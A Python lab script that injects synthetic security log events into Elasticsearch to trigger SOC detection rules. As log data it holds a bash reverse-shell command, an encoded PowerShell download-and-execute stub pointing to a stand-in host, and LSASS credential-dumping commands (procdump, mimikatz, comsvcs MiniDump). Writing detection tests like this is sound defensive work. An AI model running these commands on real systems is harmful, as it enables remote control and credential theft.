#!/usr/bin/env python3
"""
mini_soc_alert_generator.py
- Injects enriched ECS-ish logs into Elasticsearch to trigger Mini-SOC detection rules.
- Target: logs-custom-default (matches logs-custom-*)
"""

import argparse
import json
import random
import sys
import time
from datetime import datetime, timezone

import requests
from requests.auth import HTTPBasicAuth


# ----------------------------
# Helpers
# ----------------------------
def utc_now_iso() -> str:
    return datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ")


def post_doc(es_url: str, index: str, auth: HTTPBasicAuth, doc: dict) -> dict:
    r = requests.post(
        f"{es_url.rstrip('/')}/{index}/_doc",
        auth=auth,
        headers={"Content-Type": "application/json"},
        data=json.dumps(doc),
        timeout=15,
    )
    if not r.ok:
        raise RuntimeError(f"POST failed: {r.status_code} {r.text}")
    return r.json()


def ecs_common(host_name: str, agent_name: str = "mini-soc-generator") -> dict:
    # Common ECS-style envelope (enriched)
    return {
        "@timestamp": utc_now_iso(),
        "ecs": {"version": "8.11.0"},
        "agent": {
            "type": "custom",
            "name": agent_name,
            "version": "1.0.0",
            "id": f"gen-{random.randint(1000,9999)}",
        },
        "host": {
            "name": host_name,
            "hostname": host_name,
            "architecture": "x86_64",
            "os": {
                "type": "linux",
                "platform": "kali",
                "name": "Kali GNU/Linux",
                "version": "2025.x",
                "family": "debian",
            },
        },
        "observer": {
            "type": "mini-soc",
            "name": "elk-lab",
            "vendor": "custom",
        },
        "labels": {
            "project": "mini-soc",
            "generator": "mini_soc_alert_generator.py",
        },
        "tags": ["mini-soc", "demo", "synthetic"],
    }


def add_geo_for_ip(doc: dict, ip: str):
    # Fake-but-plausible geo enrichment (good for demo)
    countries = [
        ("MA", "Morocco", "Rabat", 34.0209, -6.8416),
        ("FR", "France", "Paris", 48.8566, 2.3522),
        ("US", "United States", "Ashburn", 39.0438, -77.4874),
        ("DE", "Germany", "Frankfurt", 50.1109, 8.6821),
    ]
    cc, country, city, lat, lon = random.choice(countries)
    doc.setdefault("source", {}).setdefault("geo", {})
    doc["source"]["geo"].update(
        {
            "continent_name": "Africa" if cc == "MA" else "Europe" if cc in ("FR", "DE") else "North America",
            "country_iso_code": cc,
            "country_name": country,
            "city_name": city,
            "location": {"lat": lat, "lon": lon},
        }
    )


# ----------------------------
# Scenario builders
# ----------------------------
def build_ssh_event(
    outcome: str,
    src_ip: str,
    user: str,
    host_name: str,
    src_port: int,
    session_id: str,
) -> dict:
    doc = ecs_common(host_name=host_name)
    doc["event"] = {
        "category": "authentication",
        "type": "start",
        "action": "ssh_login",
        "outcome": outcome,  # "failure" or "success"
        "module": "system",
        "dataset": "system.auth",
        "kind": "event",
    }
    doc["source"] = {"ip": src_ip, "port": src_port}
    add_geo_for_ip(doc, src_ip)
    doc["destination"] = {"ip": "10.0.0.5", "port": 22}
    doc["network"] = {
        "transport": "tcp",
        "protocol": "ssh",
        "direction": "ingress",
        "community_id": f"1:{random.randint(10**7,10**8-1)}",
    }
    doc["user"] = {"name": user, "domain": "LOCAL", "id": f"{random.randint(1000,9999)}"}
    doc["process"] = {"name": "sshd", "pid": random.randint(300, 5000)}
    doc["related"] = {"ip": [src_ip, doc["destination"]["ip"]], "user": [user]}
    doc["auth"] = {
        "ssh": {
            "method": "password",
            "signature": "pam_unix(sshd:auth)",
            "session_id": session_id,
        }
    }
    if outcome == "failure":
        doc["event"]["reason"] = "Invalid credentials"
        doc["message"] = f"Failed password for {user} from {src_ip} port {src_port} ssh2"
    else:
        doc["message"] = f"Accepted password for {user} from {src_ip} port {src_port} ssh2"
        doc["event"]["reason"] = "Authentication succeeded"
    return doc


def build_reverse_shell(src_ip: str, user: str, host_name: str) -> dict:
    doc = ecs_common(host_name=host_name)
    doc["event"] = {"category": "process", "type": "start", "kind": "event"}
    doc["source"] = {"ip": src_ip}
    add_geo_for_ip(doc, src_ip)
    doc["user"] = {"name": user, "id": f"{random.randint(1000,9999)}"}
    doc["process"] = {
        "name": "bash",
        "pid": random.randint(2000, 9000),
        "parent": {"name": "sshd", "pid": random.randint(200, 999)},
        "command_line": "bash -i >& /dev/tcp/1.1.1.1/4444 0>&1",
        "args": ["bash", "-i"],
        "working_directory": "/tmp",
    }
    doc["destination"] = {"ip": "1.1.1.1", "port": 4444}
    doc["network"] = {"direction": "egress", "transport": "tcp", "protocol": "tcp"}
    doc["message"] = "Suspicious reverse shell pattern executed"
    doc["threat"] = {
        "tactic": {"name": "Command and Control", "id": "TA0011"},
        "technique": [{"name": "Application Layer Protocol", "id": "T1071"}],
    }
    return doc


def build_network_connection(src_ip: str, dst_ip: str, dst_port: int, host_name: str) -> dict:
    doc = ecs_common(host_name=host_name)
    doc["event"] = {"category": "network", "type": "connection", "kind": "event"}
    doc["source"] = {"ip": src_ip, "port": random.randint(1024, 65535)}
    add_geo_for_ip(doc, src_ip)
    doc["destination"] = {"ip": dst_ip, "port": dst_port}
    doc["network"] = {
        "direction": "egress",
        "transport": "tcp",
        "protocol": "tcp",
        "bytes": random.randint(200, 2500),
        "packets": random.randint(3, 30),
        "community_id": f"1:{random.randint(10**7,10**8-1)}",
    }
    doc["message"] = f"Outbound connection to {dst_ip}:{dst_port} (simulated)"
    return doc


def build_windows_powershell(src_ip: str, host_name: str) -> dict:
    doc = ecs_common(host_name=host_name)
    # Override host.os to look Windows-like (enrichment)
    doc["host"]["os"] = {
        "type": "windows",
        "platform": "windows",
        "name": "Windows 10 Pro",
        "version": "22H2",
        "family": "windows",
    }
    doc["event"] = {"category": "process", "type": "start", "kind": "event"}
    doc["source"] = {"ip": src_ip}
    add_geo_for_ip(doc, src_ip)

    # Suspicious patterns used in your rule: -enc, EncodedCommand, Bypass, IEX, Invoke-Expression
    encoded_stub = "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AZQB2AGkAbAAuAGwAbwBjAGEAbAAiACkA"
    cmd = f'powershell.exe -NoP -NonI -W Hidden -ExecutionPolicy Bypass -EncodedCommand {encoded_stub}'

    doc["process"] = {
        "name": "powershell.exe",
        "pid": random.randint(1000, 20000),
        "parent": {"name": "explorer.exe", "pid": random.randint(800, 4000)},
        "command_line": cmd,
        "args": ["powershell.exe", "-NoP", "-NonI", "-W", "Hidden", "-ExecutionPolicy", "Bypass", "-EncodedCommand", encoded_stub],
        "executable": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
    }
    doc["user"] = {"name": "DESKTOP\\user", "id": f"S-1-5-21-{random.randint(10**9,10**10-1)}"}
    doc["message"] = "Suspicious PowerShell execution (EncodedCommand/Bypass)"
    doc["threat"] = {
        "tactic": {"name": "Execution", "id": "TA0002"},
        "technique": [{"name": "PowerShell", "id": "T1059.001"}],
    }
    return doc


def build_windows_credential_dumping(src_ip: str, host_name: str) -> dict:
    doc = ecs_common(host_name=host_name)
    doc["host"]["os"] = {
        "type": "windows",
        "platform": "windows",
        "name": "Windows Server 2019",
        "version": "1809",
        "family": "windows",
    }
    doc["event"] = {"category": "process", "type": "start", "kind": "event"}
    doc["source"] = {"ip": src_ip}
    add_geo_for_ip(doc, src_ip)

    # Your rule matches names/command lines: procdump.exe, mimikatz.exe, rundll32.exe, comsvcs.dll, lsass, sekurlsa, logonpasswords, "MiniDump"
    variant = random.choice(["procdump", "mimikatz", "rundll32"])
    if variant == "procdump":
        cmd = r'procdump.exe -accepteula -ma lsass.exe C:\Windows\Temp\lsass.dmp'
        pname = "procdump.exe"
        args = ["procdump.exe", "-accepteula", "-ma", "lsass.exe", r"C:\Windows\Temp\lsass.dmp"]
    elif variant == "mimikatz":
        cmd = r'mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit'
        pname = "mimikatz.exe"
        args = ["mimikatz.exe", "privilege::debug", "sekurlsa::logonpasswords", "exit"]
    else:
        cmd = r'rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 612 C:\Windows\Temp\lsass.dmp full'
        pname = "rundll32.exe"
        args = ["rundll32.exe", r"C:\Windows\System32\comsvcs.dll,", "MiniDump", "612", r"C:\Windows\Temp\lsass.dmp", "full"]

    doc["process"] = {
        "name": pname,
        "pid": random.randint(1000, 20000),
        "parent": {"name": "cmd.exe", "pid": random.randint(800, 4000)},
        "command_line": cmd,
        "args": args,
    }
    doc["user"] = {"name": "NT AUTHORITY\\SYSTEM", "id": "S-1-5-18"}
    doc["file"] = {"path": r"C:\Windows\Temp\lsass.dmp", "extension": "dmp"}
    doc["message"] = "Potential credential dumping activity targeting LSASS"
    doc["threat"] = {
        "tactic": {"name": "Credential Access", "id": "TA0006"},
        "technique": [{"name": "OS Credential Dumping", "id": "T1003"}],
    }
    return doc


# ----------------------------
# Scenario runners (to trigger rules)
# ----------------------------
def run_ssh_bruteforce(es_url, index, auth, host_name, src_ip, user, n=6, sleep_s=0.15):
    session_id = f"sess-{random.randint(10000,99999)}"
    for i in range(n):
        doc = build_ssh_event(
            outcome="failure",
            src_ip=src_ip,
            user=user,
            host_name=host_name,
            src_port=random.randint(20000, 60000),
            session_id=session_id,
        )
        post_doc(es_url, index, auth, doc)
        time.sleep(sleep_s)


def run_ssh_success_after_bruteforce(es_url, index, auth, host_name, src_ip, user, failures=5, sleep_s=0.15):
    session_id = f"sess-{random.randint(10000,99999)}"
    for _ in range(failures):
        doc = build_ssh_event(
            outcome="failure",
            src_ip=src_ip,
            user=user,
            host_name=host_name,
            src_port=random.randint(20000, 60000),
            session_id=session_id,
        )
        post_doc(es_url, index, auth, doc)
        time.sleep(sleep_s)

    doc = build_ssh_event(
        outcome="success",
        src_ip=src_ip,
        user=user,
        host_name=host_name,
        src_port=random.randint(20000, 60000),
        session_id=session_id,
    )
    post_doc(es_url, index, auth, doc)


def run_network_recon(es_url, index, auth, host_name, src_ip, count=35, sleep_s=0.03):
    # Many outbound connections => triggers recon burst threshold by source.ip >= 30
    dst_ip = "10.0.0.10"
    for _ in range(count):
        port = random.randint(1, 1024)  # simulate scanning well-known ports
        doc = build_network_connection(src_ip=src_ip, dst_ip=dst_ip, dst_port=port, host_name=host_name)
        post_doc(es_url, index, auth, doc)
        time.sleep(sleep_s)


def run_network_exfil(es_url, index, auth, host_name, src_ip, dst_ip="93.184.216.34", count=55, sleep_s=0.02):
    # Your rule: event.category=network AND event.type=connection AND network.direction=egress AND destination.port:(80 or 443)
    # Threshold: All results >= 50 (no group-by in your screenshot), so just send >= 50 events.
    for _ in range(count):
        port = random.choice([80, 443])
        doc = build_network_connection(src_ip=src_ip, dst_ip=dst_ip, dst_port=port, host_name=host_name)
        # enrich as "large" transfer for demo
        doc["network"]["bytes"] = random.randint(200000, 2000000)
        doc["network"]["packets"] = random.randint(200, 2000)
        doc["event"]["reason"] = "Unusual outbound burst volume"
        post_doc(es_url, index, auth, doc)
        time.sleep(sleep_s)


def run_reverse_shell(es_url, index, auth, host_name, src_ip, user):
    doc = build_reverse_shell(src_ip=src_ip, user=user, host_name=host_name)
    post_doc(es_url, index, auth, doc)


def run_windows_powershell(es_url, index, auth, host_name, src_ip):
    doc = build_windows_powershell(src_ip=src_ip, host_name=host_name)
    post_doc(es_url, index, auth, doc)


def run_windows_cred_dump(es_url, index, auth, host_name, src_ip):
    doc = build_windows_credential_dumping(src_ip=src_ip, host_name=host_name)
    post_doc(es_url, index, auth, doc)


# ----------------------------
# CLI
# ----------------------------
def main():
    p = argparse.ArgumentParser(description="Mini-SOC enriched alert generator (ECS logs -> alerts).")
    p.add_argument("--es", default="http://localhost:9200", help="Elasticsearch URL")
    p.add_argument("--user", default="elastic", help="Elasticsearch username")
    p.add_argument("--password", default="changeme123", help="Elasticsearch password")
    p.add_argument("--index", default="logs-custom-default", help="Target data stream/index (logs-custom-*)")
    p.add_argument("--host", default="server-test", help="host.name used in events")
    p.add_argument("--src-ip", default="10.10.10.10", help="source.ip used (important for threshold group-by)")
    p.add_argument("--ssh-user", default="root", help="user.name used for SSH events")
    p.add_argument(
        "--scenario",
        required=True,
        choices=[
            "ssh_bruteforce",
            "ssh_success_after_bruteforce",
            "network_recon",
            "network_exfil",
            "reverse_shell",
            "win_powershell",
            "win_cred_dump",
            "all",
        ],
        help="Scenario to run",
    )
    args = p.parse_args()

    auth = HTTPBasicAuth(args.user, args.password)

    try:
        if args.scenario == "ssh_bruteforce":
            run_ssh_bruteforce(args.es, args.index, auth, args.host, args.src_ip, args.ssh_user)
        elif args.scenario == "ssh_success_after_bruteforce":
            run_ssh_success_after_bruteforce(args.es, args.index, auth, args.host, args.src_ip, args.ssh_user)
        elif args.scenario == "network_recon":
            run_network_recon(args.es, args.index, auth, args.host, args.src_ip)
        elif args.scenario == "network_exfil":
            run_network_exfil(args.es, args.index, auth, args.host, args.src_ip)
        elif args.scenario == "reverse_shell":
            run_reverse_shell(args.es, args.index, auth, args.host, args.src_ip, args.ssh_user)
        elif args.scenario == "win_powershell":
            run_windows_powershell(args.es, args.index, auth, host_name="WIN10-LAB", src_ip=args.src_ip)
        elif args.scenario == "win_cred_dump":
            run_windows_cred_dump(args.es, args.index, auth, host_name="WIN-SRV-LAB", src_ip=args.src_ip)
        elif args.scenario == "all":
            # Order: generate noisy-ish scenarios first, then high-confidence ones.
            run_ssh_bruteforce(args.es, args.index, auth, args.host, args.src_ip, args.ssh_user)
            run_ssh_success_after_bruteforce(args.es, args.index, auth, args.host, args.src_ip, args.ssh_user)
            run_network_recon(args.es, args.index, auth, args.host, args.src_ip)
            run_network_exfil(args.es, args.index, auth, args.host, args.src_ip)
            run_reverse_shell(args.es, args.index, auth, args.host, args.src_ip, args.ssh_user)
            run_windows_powershell(args.es, args.index, auth, host_name="WIN10-LAB", src_ip=args.src_ip)
            run_windows_cred_dump(args.es, args.index, auth, host_name="WIN-SRV-LAB", src_ip=args.src_ip)
        else:
            raise ValueError("Unknown scenario")
    except Exception as e:
        print(f"[!] Error: {e}", file=sys.stderr)
        sys.exit(1)

    print("[+] Done. Now check: Security -> Alerts (Last 15 minutes)")

if __name__ == "__main__":
    main()
